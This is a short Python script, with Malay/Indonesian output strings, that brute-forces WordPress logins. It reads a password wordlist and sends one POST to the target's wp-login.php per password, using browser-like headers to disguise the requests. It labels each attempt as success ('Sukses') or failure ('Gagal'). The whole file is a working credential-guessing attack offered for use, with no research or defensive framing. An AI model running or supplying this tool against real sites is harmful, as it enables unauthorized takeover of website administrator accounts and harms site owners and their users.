import requests, asyncio, sys
req=requests.session()
kuki={'wordpress_test_cookie':'WP+Cookie+check;','path':'/;'}
async def main(url, user, passw, sl):
    head={
    "origin": url,
    "referer": "%s/wp-login.php"%(url),
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
    }
    data={
    "log": user,
    "pwd": passw,
    "rememberme": "forever",
    "wp-submit": "Log Masuk",
    "redirect_to": "%s/wp-admin/"%url,
    "testcookie": "1"}
    hasil=req.post('%s/wp-login.php'%(url), data=data, headers=head, cookies=kuki).text
    if 'login_error' in hasil:
        print('%s => user: %s pass: %s|Gagal'%(url, user, passw))
    else:
        print('%s => user: %s pass: %s|Sukses'%(url, user, passw))
    return True

async def init(url,user,wordlist):
    vz=open(wordlist).read().splitlines()
    task=[]
    for i,sl in enumerate(vz):
        task.append(asyncio.create_task(main(url,user, sl, i)))
    await asyncio.gather(*task)
def test():
    loop = asyncio.get_event_loop()
    loop.run_until_complete(init(sys.argv[1], sys.argv[2], sys.argv[3]))
test()
